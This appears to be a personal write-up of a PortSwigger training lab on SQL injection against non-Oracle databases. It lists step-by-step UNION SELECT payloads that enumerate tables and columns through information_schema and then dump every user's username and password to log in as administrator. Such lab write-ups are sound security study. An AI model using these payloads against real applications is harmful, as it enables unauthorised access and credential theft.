# SQL Injection - Listing the Database Contents on non-Oracle Databases

## 📌 Lab Details
- **Title**: SQL Injection - Retrieving the list of username and passwords of all users
- **Difficulty**: Medium
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/81986add1fa6ec438867539cc2f562f01dcf9faf6a0b82766269c3dbeef30b00?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-non-oracle

## 🔍 Summary
This lab demonstrated how SQL Injection attack can be used to retrieve the list of the usernames and passwords to login as an administrator.

## 🛠 Steps to Solve
1. Determine the number of columns present by injecting `'+UNION+SELECT+'abc','def'--`
2. Injecting `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` to retrieve the list of tables in the database.
3. Injecting `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--` to retrieve the details of the columns in the table (replacing the table name).
4. Injecting `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--` to retrieve the usernames and passwords of all users (replacing the table and column names).
5. Find the password of administrator to log in.

## 📖 Key Takeaways
- Understanding how SQL queries can be manipulated.
- Using `UNION` and `SELECT` commands to extract data from tables.


